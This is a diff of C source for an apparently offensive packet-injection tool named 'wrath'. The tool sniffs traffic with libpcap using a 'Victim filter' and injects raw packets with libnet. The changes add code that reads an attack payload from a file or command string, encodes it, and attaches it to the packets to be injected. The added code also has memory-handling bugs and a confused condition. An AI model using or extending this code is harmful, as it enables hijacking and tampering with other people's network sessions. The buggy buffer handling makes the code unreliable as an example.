@@ -56,11 +56,11 @@ pcap_t *wrath_position(struct arg_values *cline_args) {
 	printf("Victim filter: %s\n", filter_str);
 
 	if ((pcap_compile(pcap_handle, &fp, filter_str, 1, 0)) == -1) {
-		pcap_perror(pcap_handle, "ERROR compiling filter");
+		pcap_perror(pcap_handle, "[ERROR] compiling filter");
 		exit(1); 
 	}
 	if (pcap_setfilter(pcap_handle, &fp) == -1) {
-		pcap_perror(pcap_handle, "ERROR setting filter");
+		pcap_perror(pcap_handle, "[ERROR] setting filter");
 		exit(1);
 	}
 
@@ -96,15 +96,38 @@ void wrath_observe(struct arg_values *cline_args) {
 			device = cline_args->interface;
 		}
 
-	// this might need to malloced when we start writing packets
-	// to the network
-	// need to initialize environment for libent in advanced mode
+	// initializing environment for libent in advanced mode
 	libnet_handle = libnet_init(LIBNET_RAW4_ADV, device, libnet_errbuf);
 	if (libnet_handle == NULL) {
 		fprintf(stderr, "trouble initiating libnet interface: %s \n", libnet_errbuf);
 		exit(1);
 	}
 	chp->libnet_handle = libnet_handle;
+
+	// finding payload
+	int length;
+	char *app_cmd = "\0";
+	if (strcmp(cline_args->input_file, "\0") != 0) { // If an input file has been specified
+		int app_fd;
+		app_fd = open(cline_args->input_file, O_RDONLY, 0);
+		if ((length = file_size(app_fd)) == -1)
+			fatal_error("getting file size");
+		app_cmd = (char *) safe_malloc(length);
+		read(app_fd, app_cmd, length);
+	} else if (!strcmp(cline_args->command, "\0") != 0) { // If a command has been specified but not an input file
+		length = strlen(cline_args->command);
+		app_cmd = (unsigned char *) safe_malloc(length);
+		strcpy(app_cmd, cline_args->command);
+	}	
+
+	// converting and setting payload
+	char *app_cmd_con = (char *) malloc(strlen(app_cmd));
+	if (strcmp(app_cmd, "\0") != 0) { // if a payload was found
+		wrath_char_encode(app_cmd, app_cmd_con);
+		free(app_cmd);	
+		chp->payload = app_cmd_con;
+	} else
+		chp->payload = NULL;
 	
 	// seeding psuedorandom number generator
 	libnet_seed_prand(libnet_handle);
@@ -124,5 +147,6 @@ void wrath_observe(struct arg_values *cline_args) {
 	printf("Packets Injected: %d\n", l_stats.packets_sent);
 
 	libnet_destroy(libnet_handle);
+	free(app_cmd_con);
 	free(chp);
 }
